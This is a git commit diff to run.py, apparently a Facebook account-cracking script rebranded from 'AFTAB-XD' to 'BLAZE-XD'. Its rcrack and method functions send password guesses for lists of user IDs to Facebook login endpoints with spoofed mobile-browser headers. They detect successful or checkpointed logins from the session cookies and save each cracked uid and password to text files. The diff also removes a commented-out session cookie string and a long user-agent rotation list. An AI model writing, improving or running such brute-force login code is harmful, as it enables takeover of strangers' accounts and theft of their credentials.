55625bf8a48fadd90770df240b954eabe42bb965
BLAZE-XD <156874822+raazuhero@users.noreply.github.com>
2024-03-23 10:07:43 +0000

    Update run.py

--- run.py
+++ run.py
@@ -810,12 +810,11 @@ def rcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {		
+			headers = {
     'authority': 'p.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
     'cache-control': 'max-age=0',
-    # 'cookie': 'sb=OovjY6YnfgL5dZyZF6OBpGuX; datr=3of2ZWlrl_Zf5K6ztbCk_OSj; ps_n=0; ps_l=0; dpr=1.655194878578186; locale=en_GB; vpd=v1%3B707x400x1.655194878578186; wl_cbv=v2%3Bclient_version%3A2446%3Btimestamp%3A1711160153; m_pixel_ratio=1.655194878578186; wd=435x821; fr=0iy2V8QK7dSzGaUUC.AWWEl21Mp7oxddqjCHyB2F5j34g.Bl870q..AAA.0.0.Bl_jub.AWUBgwlef-k',
     'dpr': '1.8000000715255737',
     'sec-ch-prefers-color-scheme': 'dark',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
@@ -826,12 +825,13 @@ def rcrack(uid,pwx,tl):
     'sec-ch-ua-platform-version': '"10.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
+    'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36',
-    'viewport-width': '980',
-                        }
+    'viewport-width': '980',}
+
+                        
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
@@ -843,13 +843,13 @@ def rcrack(uid,pwx,tl):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
 				print('\033[1;96m[BLAZE-CP] '+cid+' | '+ps+'\033[0;97m')
-				open('cp.txt', 'a').write(uid+' | '+ps+'\n')
+				open('cp.txt', 'a').write(uid+'  | '+ps+'\n')
 				cps.append(cid)
 				break
 			else:
 				continue
 		loop+=1
-		sys.stdout.write('\r\033[1;97m[AFTAB-XD] [%s/%s] OK:- %s CP:- %s \r'%(loop,tl,len(oks),len(cps))),
+		sys.stdout.write('\r\033[1;97m[BLAZE-XD] [%s/%s] OK:- %s CP:- %s \r'%(loop,tl,len(oks),len(cps))),
 		sys.stdout.flush()
 	except:
 		pass
@@ -963,81 +963,7 @@ def file():
 
 
 
-####
-"""
-Mozilla/5.0 (Linux; arm_64; Android 11; CPH2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5785.118 Mobile Safari/537.36
-Mozilla/5.0 (Linux; arm_64; Android 10; CPH2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5703.109 Mobile Safari/537.36
-Mozilla/5.0 (Linux; arm_64; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.58<anyDigit>5.117 Mobile Safari/537.36
-Mozilla/5.0 (Linux; arm_64; Android 11; Mi Note 10 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5800.70 Mobile Safari/537.36
-Mozilla/5.0 (Linux; arm_64; Android 10; Xenium S266) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 YaBrowser/21.5.0.350.00 SA/3 Mobile Safari/537.36
-Mozilla/5.0 (Windows NT 10.0; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5025.103 Safari/537.36
-Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
-Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36
-Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
-Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
-Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
-Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
-Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17
-Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0
-Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
-Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
-Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4
-Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53
-Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
-Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFASWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
-Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4
-Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
-Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4
-Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko
-Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; KFJWI Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
-Mozilla/5.0 (iPad; CPU OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53
-Mozilla/5.0 (X11; CrOS armv7l 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36
-Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5
-Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
-Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25
-Mozilla/5.0 (Linux; Android 9.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2821.146 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 8.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2438.124 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 9.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.2325.100 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 3.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.2737.108 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 8.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.2691.103 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 6.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.2694.86 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 3.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.2854.131 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 9.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2746.80 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 4.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2684.125 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 4.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.2458.89 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 4.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.2516.140 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 6.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2692.150 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 8.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2722.79 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 4.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.2888.86 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 9.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.2348.116 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 8.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.2755.98 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 7.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2742.149 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 9.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.2304.134 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 8.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.2698.140 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 4.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.2409.115 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 5.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.2851.96 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 9.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.2673.94 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 8.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2376.82 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 5.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.2641.83 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 7.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2869.130 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 6.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2500.149 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 7.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2875.109 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 3.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2635.124 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 3.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.2692.123 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 7.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2591.87 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 5.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.2723.120 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 7.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.2468.108 Mobile Safari/537.36
-Mozilla/5.0 (Linux; Android 6.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.2731.138 Mobile Safari/537.36
-"""
-####
+
 
 
 def method():
@@ -1102,7 +1028,7 @@ def method():
       #      print(response.text)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m [AFTAB-Ok] '+acc+'| '+pword+'')
+                print('\r\033[1;92m [BLAZE-Ok] '+acc+' | '+pword+'')
                 open('/sdcard/AFTAB-Ok.txt','a').write(f'{acc}|{pword}\n ')
                 if c=='y':
                     try:
